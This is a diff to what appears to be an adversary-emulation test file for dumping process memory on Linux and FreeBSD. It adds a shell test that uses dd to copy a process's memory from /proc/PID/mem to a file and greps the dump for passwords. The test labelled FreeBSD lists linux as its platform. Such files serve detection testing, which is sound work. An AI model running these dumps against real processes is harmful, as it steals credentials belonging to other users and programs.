@@ -6,7 +6,6 @@ atomic_tests:
   description: |
     Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
     copy process memory to an external file so it can be searched or exfiltrated later.
-
   supported_platforms:
   - linux
 
@@ -49,12 +48,59 @@ atomic_tests:
     cleanup_command: |
       rm -f "#{output_file}"
 
+- name: Dump individual process memory with sh on FreeBSD (Local)
+  auto_generated_guid: fa37b633-e097-4415-b2b8-c5bf4c86e423
+  description: |
+    Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
+    copy process memory to an external file so it can be searched or exfiltrated later.
+    On FreeBSD procfs must be mounted.
+  supported_platforms:
+  - linux
+
+  input_arguments:
+    output_file:
+      description: Path where captured results will be placed
+      type: path
+      default: /tmp/T1003.007.bin
+    script_path:
+      description: Path to script generating the target process
+      type: path
+      default: /tmp/T1003.007.sh
+    pid_term:
+      description: Unique string to use to identify target process
+      type: string
+      default: T1003.007
+
+  dependencies:
+  - description: |
+      Script to launch target process must exist
+    prereq_command: |
+      test -f #{script_path}
+      grep "#{pid_term}" #{script_path}
+    get_prereq_command: |
+      echo '#!/bin/sh' > #{script_path}
+      echo "sh -c 'echo \"The password is #{pid_term}\" && sleep 30' &" >> #{script_path}
+
+  executor:
+    name: sh
+    elevation_required: true
+    command: |
+      sh #{script_path}
+      PID=$(pgrep -n -f "#{pid_term}")
+      MEM_START=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f1)
+      MEM_STOP=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f2)
+      MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
+      dd if=/proc/"${PID}"/mem of="#{output_file}" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
+      strings "#{output_file}" | grep -i PASS
+    cleanup_command: |
+      rm -f "#{output_file}"
+
 - name: Dump individual process memory with Python (Local)
   auto_generated_guid: 437b2003-a20d-4ed8-834c-4964f24eec63
   description: |
     Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to
     copy a process's heap memory to an external file so it can be searched or exfiltrated later.
-
+    On FreeBSD procfs must be mounted.
   supported_platforms:
   - linux
 
